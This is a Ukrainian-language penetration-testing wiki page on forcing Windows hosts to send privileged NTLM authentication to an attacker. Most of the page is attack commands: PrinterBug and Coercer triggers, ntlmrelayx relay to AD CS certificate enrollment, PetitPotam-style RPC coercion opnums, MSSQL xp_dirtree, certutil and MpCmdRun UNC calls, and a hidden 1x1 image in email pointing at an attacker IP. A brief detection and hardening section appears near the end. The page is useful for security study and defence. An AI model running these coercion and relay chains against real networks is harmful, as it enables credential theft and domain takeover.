# Примусова привілейована автентифікація NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) — це **набір** **тригерів віддаленої автентифікації**, написаних на C# за допомогою компілятора MIDL, щоб уникнути залежностей від сторонніх компонентів.

## Зловживання службою Spooler

Якщо службу _**Print Spooler**_ **увімкнено,** можна використати деякі вже відомі облікові дані AD, щоб **запросити** у сервера друку контролера домену **оновлення** щодо нових завдань друку, а потім вказати йому **надіслати сповіщення до певної системи**.\
Зверніть увагу: коли принтер надсилає сповіщення до довільної системи, йому потрібно **автентифікуватися на** цій **системі**. Отже, зловмисник може змусити службу _**Print Spooler**_ автентифікуватися на довільній системі, і під час цієї автентифікації служба **використає обліковий запис комп’ютера**.

Під капотом класична примітива **PrinterBug** зловживає **`RpcRemoteFindFirstPrinterChangeNotificationEx`** через **`\\PIPE\\spoolss`**. Спочатку зловмисник відкриває дескриптор принтера/сервера, а потім передає підроблене ім’я клієнта в `pszLocalMachine`, через що цільовий spooler створює канал сповіщень **назад до хоста під контролем зловмисника**. Саме тому результатом є **примусова вихідна автентифікація**, а не безпосереднє виконання коду.<sup>[[2]](#references)</sup>\
Якщо ви шукаєте **RCE/LPE** безпосередньо у spooler, перегляньте [PrintNightmare](printnightmare.md). Ця сторінка присвячена **примусовій автентифікації та relay**.

### Пошук Windows-серверів у домені

Використовуйте PowerShell, щоб отримати список Windows-хостів. Сервери зазвичай є пріоритетними цілями, тому спочатку зосередьтеся на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Пошук служб Spooler, що прослуховують

Використовуючи дещо модифікований [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) від @mysmartlogin (Vincent Le Toux), перевірте, чи прослуховує Spooler Service:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Також можна використовувати `rpcdump.py` у Linux і шукати протокол **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Або швидко перевірити хости з Linux за допомогою **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Якщо ви хочете **перерахувати coercion surfaces**, а не лише перевірити, чи існує spooler endpoint, використовуйте **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Це корисно, оскільки наявність endpoint в EPM лише підтверджує, що RPC-інтерфейс друку зареєстрований. Це **не** гарантує, що кожен метод примусу доступний із вашими поточними привілеями або що хост ініціює придатний для використання процес автентифікації.

### Попросити службу автентифікуватися на довільному хості

Ви можете скомпілювати [SpoolSample звідси](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використовуйте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте в Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
За допомогою **Coercer** можна безпосередньо звертатися до інтерфейсів spooler і не вгадувати, який метод RPC доступний:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Сучасні callbacks RPC-over-TCP

Не припускайте, що успішний виклик `RpcRemoteFindFirstPrinterChangeNotificationEx` обов’язково створює трафік через TCP/445. **Windows 11 22H2 і новіші версії за замовчуванням використовують RPC over TCP для print communications**; RPC через named pipes вимкнено, якщо policy або `RpcUseNamedPipeProtocol=1` не відновлює його. Тому listeners, що працюють лише через SMB, можуть повідомити, що trigger було надіслано, але так і не отримати callback. Microsoft документує TCP/135 (Endpoint Mapper) і динамічні RPC-порти для звичайного print RPC; організації можуть обмежити цей діапазон або вибрати фіксований print RPC port.<sup>[[10]](#references)</sup>

Поточний **Impacket `ntlmrelayx.py`** містить RPC relay server і невеликий Endpoint Mapper, увімкнений за замовчуванням на TCP/135. Цю підтримку було додано в червні 2025 року спеціально для продемонстрованого PrinterBug-to-AD-CS chain, що дає змогу relay-ити автентифікований RPC callback, навіть коли victim не переходить на SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Шукайте `Setting up RPC Server on port 135` і `RPCD: Received connection` у виводі relay. Якщо RPC-виклик повертає очікувану помилку, але до listener нічого не надходить, перевірте політику print RPC transport на victim, outbound filtering, розв’язання DNS і те, чи не використовує інший процес TCP/135. Також переконайтеся, що `ntlmrelayx` не було запущено з параметром `--no-rpc-server`.

### Примусове використання HTTP замість SMB за допомогою WebClient

У системах, які все ще використовують **RPC через named pipes** (legacy builds або поведінка, відновлена політикою), класичний PrinterBug зазвичай спричиняє автентифікацію **SMB** до `\\attacker\share`, що все ще корисно для **capture**, **relay до HTTP targets** або **relay, де SMB signing відсутній**.\
Однак relay **SMB до SMB** часто блокується через **SMB signing**, тому operators можуть надати перевагу примусовій автентифікації **HTTP/WebDAV**. Це не є fallback для описаної вище поведінки RPC-over-TCP.

Якщо на target запущено service **WebClient**, listener можна вказати у формі, яка змусить Windows використовувати **WebDAV через HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Це особливо корисно під час поєднання з **`ntlmrelayx --adcs`** або іншими HTTP relay targets, оскільки дає змогу не покладатися на можливість SMB relay у примусово встановленому з'єднанні. Важливе застереження: **WebClient має бути запущений** на victim, щоб варіант HTTP/WebDAV працював.

### Поєднання з Unconstrained Delegation

Якщо attacker скомпрометував computer, налаштований для [Unconstrained Delegation](unconstrained-delegation.md), він може **примусити printer автентифікуватися на цьому computer**. **TGT** облікового запису printer computer потім кешується в пам'яті на host з unconstrained delegation, звідки attacker може отримати та повторно використати його за допомогою [Pass the Ticket](pass-the-ticket.md).

### Примітки щодо виявлення та hardening

Найнадійніший спосіб видалити PrinterBug із DC, PAW або server, який не виконує друк, — зупинити та вимкнути Spooler. Якщо друк необхідний, посильте захист усіх можливих relay destinations (SMB server signing, LDAP signing/channel binding і EPA для HTTP services, таких як AD CS), а не покладайтеся на те, що блокування TCP/445 на callback path буде достатнім.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Виявлення має корелювати автентифікований виклик до UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, особливо opnum 62/65 із нелокальним значенням callback, і негайне вихідне SMB-, HTTP- або RPC-з'єднання від хоста spooler. Створюйте baseline для **interface UUID/opnum і пар джерело/призначення**, а не лише для доступу до `\PIPE\spoolss`, оскільки сучасні print stacks можуть розміщувати callback через RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Матриця RPC UNC-path coercion (інтерфейси/opnums, що запускають вихідну автентифікацію)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: асинхронний print interface у тому самому spooler pipe; використовуйте Coercer для переліку доступних методів на заданому хості<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (також через \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Примітка: ці методи приймають параметри, які можуть містити UNC path (наприклад, `\\attacker\share`). Під час обробки Windows автентифікується (у контексті machine/user) до цього UNC, що дає змогу захопити або relay NetNTLM.\
Для spooler abuse **MS-RPRN opnum 65** залишається найпоширенішим і найкраще задокументованим primitive, оскільки специфікація протоколу прямо зазначає, що сервер створює notification channel назад до клієнта, вказаного в `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN через \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target намагається відкрити вказаний backup log path і автентифікується до UNC, контрольованого attacker.<sup>[[1]](#references)</sup>
- Practical use: примусити assets рівня Tier 0 (DC/RODC/Citrix тощо) надсилати NetNTLM, а потім виконати relay до AD CS endpoints (сценарії ESC8/ESC11) або інших привілейованих сервісів.<sup>[[1]](#references)</sup>

## PrivExchange

Атака `PrivExchange` є результатом вразливості у функції **Exchange Server `PushSubscription`**. Ця функція дає змогу змусити Exchange server будь-яким domain user із mailbox автентифікуватися до будь-якого client-provided host через HTTP.

За замовчуванням **Exchange service працює як SYSTEM** і має надмірні privileges (зокрема, **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Цю вразливість можна використати для **relay інформації до LDAP, а потім видобути domain NTDS database**. Якщо relay до LDAP неможливий, цю вразливість усе одно можна використати для relay та автентифікації до інших хостів у domain. Успішна експлуатація цієї атаки надає негайний доступ до Domain Admin із будь-яким автентифікованим domain user account.

## Усередині Windows

Якщо ви вже перебуваєте всередині Windows machine, можна змусити Windows під'єднатися до сервера, використовуючи privileged accounts, за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використайте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

За допомогою lolbin certutil.exe (двійкового файлу, підписаного Microsoft) можна примусово ініціювати NTLM-аутентифікацію:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Через email

Якщо вам відома **email-адреса** користувача, який входить до системи на машині, яку ви хочете скомпрометувати, ви можете просто надіслати йому **email із зображенням розміром 1x1** на кшталт
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Коли жертва відкриває його, Windows намагається автентифікуватися.

### MitM

Якщо ви можете виконати атаку MitM і впровадити HTML-код на сторінку, яку переглядає жертва, спробуйте впровадити зображення, наприклад:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Інші способи примусово ініціювати та виманити NTLM-аутентифікацію


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Злам NTLMv1

Якщо ви можете перехопити [виклики NTLMv1, прочитайте тут, як їх зламати](../ntlm/index.html#ntlmv1-attack).\
_Пам’ятайте, що для злому NTLMv1 потрібно встановити challenge Responder на "1122334455667788"_

## References

- [1] [Unit 42 – Автентифікаційний coercion продовжує розвиватися](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Протокол віддаленого доступу до журналу подій](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Оновлення RPC-підключень для друку у Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server і Endpoint Mapper для ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
